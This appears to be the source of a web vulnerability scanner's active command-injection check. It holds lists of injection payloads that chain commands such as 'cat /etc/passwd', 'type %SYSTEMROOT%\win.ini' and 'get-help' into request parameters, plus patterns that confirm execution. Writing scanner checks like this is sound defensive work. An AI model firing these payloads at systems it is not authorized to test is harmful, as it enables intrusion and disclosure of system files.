import {
  continueWith,
  defineCheck,
  done,
  ScanAggressivity,
  Severity,
} from "engine";

import { Tags } from "../../types";
import {
  bodyMatchesAny,
  extractParameters,
  hasParameters,
  type Parameter,
} from "../../utils";
import { keyStrategy } from "../../utils/key";

type PayloadConfig = {
  payload: string;
  pattern: RegExp;
  description: string;
};

type State = {
  testParams: Parameter[];
  currentPayloadIndex: number;
  currentParamIndex: number;
};

// Unix/Linux command injection payloads
const UNIX_PAYLOADS: PayloadConfig[] = [
  {
    payload: "cat /etc/passwd",
    pattern: /root:.:0:0/,
    description: "Basic command execution",
  },
  {
    payload: "&cat /etc/passwd&",
    pattern: /root:.:0:0/,
    description: "Command chaining with &",
  },
  {
    payload: ";cat /etc/passwd;",
    pattern: /root:.:0:0/,
    description: "Command chaining with semicolon",
  },
  {
    payload: '"&cat /etc/passwd&"',
    pattern: /root:.:0:0/,
    description: "Command chaining with double quotes",
  },
  {
    payload: '";cat /etc/passwd;"',
    pattern: /root:.:0:0/,
    description: "Command chaining with semicolon and double quotes",
  },
  {
    payload: "'&cat /etc/passwd&'",
    pattern: /root:.:0:0/,
    description: "Command chaining with single quotes",
  },
  {
    payload: "';cat /etc/passwd;'",
    pattern: /root:.:0:0/,
    description: "Command chaining with semicolon and single quotes",
  },
  {
    payload: "\ncat /etc/passwd\n",
    pattern: /root:.:0:0/,
    description: "Command execution with newlines",
  },
  {
    payload: "`cat /etc/passwd`",
    pattern: /root:.:0:0/,
    description: "Command execution with backticks",
  },
  {
    payload: "||cat /etc/passwd",
    pattern: /root:.:0:0/,
    description: "Command execution with OR operator",
  },
  {
    payload: "&&cat /etc/passwd",
    pattern: /root:.:0:0/,
    description: "Command execution with AND operator",
  },
  {
    payload: "|cat /etc/passwd#",
    pattern: /root:.:0:0/,
    description: "Command execution with pipe and comment",
  },
];

// Windows command injection payloads
const WINDOWS_PAYLOADS: PayloadConfig[] = [
  {
    payload: "type %SYSTEMROOT%\\win.ini",
    pattern: /\[fonts\]/,
    description: "Basic Windows command execution",
  },
  {
    payload: "&type %SYSTEMROOT%\\win.ini",
    pattern: /\[fonts\]/,
    description: "Windows command chaining with &",
  },
  {
    payload: "|type %SYSTEMROOT%\\win.ini",
    pattern: /\[fonts\]/,
    description: "Windows command chaining with pipe",
  },
  {
    payload: '"&type %SYSTEMROOT%\\win.ini"',
    pattern: /\[fonts\]/,
    description: "Windows command chaining with double quotes",
  },
  {
    payload: '"|type %SYSTEMROOT%\\win.ini',
    pattern: /\[fonts\]/,
    description: "Windows command chaining with pipe and double quotes",
  },
  {
    payload: "'&type %SYSTEMROOT%\\win.ini&'",
    pattern: /\[fonts\]/,
    description: "Windows command chaining with single quotes",
  },
  {
    payload: "'|type %SYSTEMROOT%\\win.ini",
    pattern: /\[fonts\]/,
    description: "Windows command chaining with pipe and single quotes",
  },
  {
    payload: "run type %SYSTEMROOT%\\win.ini",
    pattern: /\[fonts\]/,
    description: "FoxPro command execution",
  },
];

// PowerShell command injection payloads
const POWERSHELL_PAYLOADS: PayloadConfig[] = [
  {
    payload: "get-help",
    pattern: /(?:\sGet-Help)|cmdlet|get-alias/i,
    description: "Basic PowerShell command execution",
  },
  {
    payload: ";get-help",
    pattern: /(?:\sGet-Help)|cmdlet|get-alias/i,
    description: "PowerShell command chaining with semicolon",
  },
  {
    payload: '";get-help',
    pattern: /(?:\sGet-Help)|cmdlet|get-alias/i,
    description: "PowerShell command chaining with double quotes",
  },
  {
    payload: "';get-help",
    pattern: /(?:\sGet-Help)|cmdlet|get-alias/i,
    description: "PowerShell command chaining with single quotes",
  },
  {
    payload: ";get-help #",
    pattern: /(?:\sGet-Help)|cmdlet|get-alias/i,
    description: "PowerShell command chaining with comment",
  },
];

// Combine all payloads
const ALL_PAYLOADS = [
  ...UNIX_PAYLOADS,
  ...WINDOWS_PAYLOADS,
  ...POWERSHELL_PAYLOADS,
];

export default defineCheck<State>(({ step }) => {
  step("findParameters", (state, context) => {
    const testParams = extractParameters(context);

    if (testParams.length === 0) {
      return done({ state });
    }

    return continueWith({
      nextStep: "testPayloads",
      state: {
        ...state,
        testParams,
        currentPayloadIndex: 0,
        currentParamIndex: 0,
      },
    });
  });

  step("testPayloads", async (state, context) => {
    if (
      state.testParams.length === 0 ||
      state.currentParamIndex >= state.testParams.length
    ) {
      return done({ state });
    }

    const currentParam = state.testParams[state.currentParamIndex];
    if (currentParam === undefined) {
      return done({ state });
    }

    // Determine how many payloads to test based on aggressivity
    let maxPayloads = ALL_PAYLOADS.length;
    if (context.config.aggressivity === ScanAggressivity.LOW) {
      maxPayloads = 3;
    } else if (context.config.aggressivity === ScanAggressivity.MEDIUM) {
      maxPayloads = 7;
    } else if (context.config.aggressivity === ScanAggressivity.HIGH) {
      maxPayloads = 13;
    }

    if (state.currentPayloadIndex >= maxPayloads) {
      const nextParamIndex = state.currentParamIndex + 1;
      if (nextParamIndex >= state.testParams.length) {
        return done({ state });
      }

      return continueWith({
        nextStep: "testPayloads",
        state: {
          ...state,
          currentParamIndex: nextParamIndex,
          currentPayloadIndex: 0,
        },
      });
    }

    const currentPayloadConfig = ALL_PAYLOADS[state.currentPayloadIndex];
    if (currentPayloadConfig === undefined) {
      return done({ state });
    }

    // Check if the original response already contains the expected pattern
    const originalResponse = context.target.response;
    if (
      originalResponse !== undefined &&
      bodyMatchesAny(originalResponse, [currentPayloadConfig.pattern])
    ) {
      // Skip this payload as it already matches in the original response
      return continueWith({
        nextStep: "testPayloads",
        state: {
          ...state,
          currentPayloadIndex: state.currentPayloadIndex + 1,
        },
      });
    }

    const testValue = currentParam.value + currentPayloadConfig.payload;
    const testRequestSpec = currentParam.inject(testValue);
    const { request: testRequest, response: testResponse } =
      await context.sdk.requests.send(testRequestSpec);

    if (testResponse !== undefined) {
      const responseBody = testResponse.getBody()?.toText();
      if (responseBody !== undefined) {
        // Unescape HTML entities if the response is HTML
        let content = responseBody;
        const contentType = testResponse
          .getHeader("Content-Type")?.[0]
          ?.toLowerCase();
        if (contentType !== undefined && contentType.includes("html")) {
          content = content
            .replace(/&lt;/g, "<")
            .replace(/&gt;/g, ">")
            .replace(/&amp;/g, "&")
            .replace(/&quot;/g, '"')
            .replace(/&#x27;/g, "'");
        }

        if (currentPayloadConfig.pattern.test(content)) {
          return done({
            findings: [
              {
                name:
                  "Command Injection in parameter '" + currentParam.name + "'",
                description: `Parameter \`${currentParam.name}\` in ${currentParam.source} is vulnerable to command injection. The application executed the injected command and returned its output.\n\n**Payload used:**\n\`\`\`\n${testValue}\n\`\`\`\n\n**Description:**\n${currentPayloadConfig.description}\n\n**Evidence found:**\nThe response contained output from the executed command, indicating successful command injection.`,
                severity: Severity.CRITICAL,
                correlation: {
                  requestID: testRequest.getId(),
                  locations: [],
                },
              },
            ],
            state,
          });
        }
      }
    }

    return continueWith({
      nextStep: "testPayloads",
      state: {
        ...state,
        currentPayloadIndex: state.currentPayloadIndex + 1,
      },
    });
  });

  return {
    metadata: {
      id: "command-injection",
      name: "Command Injection",
      description:
        "Detects command injection vulnerabilities by attempting to execute system commands and verifying their output",
      type: "active",
      tags: [Tags.INJECTION, Tags.COMMAND_EXECUTION],
      severities: [Severity.CRITICAL],
      aggressivity: {
        minRequests: 1,
        maxRequests: "Infinity",
      },
    },
    dedupeKey: keyStrategy()
      .withMethod()
      .withHost()
      .withPort()
      .withPath()
      .withQueryKeys()
      .build(),
    initState: () => ({
      testParams: [],
      currentPayloadIndex: 0,
      currentParamIndex: 0,
    }),
    when: (target) => {
      return hasParameters(target);
    },
  };
});
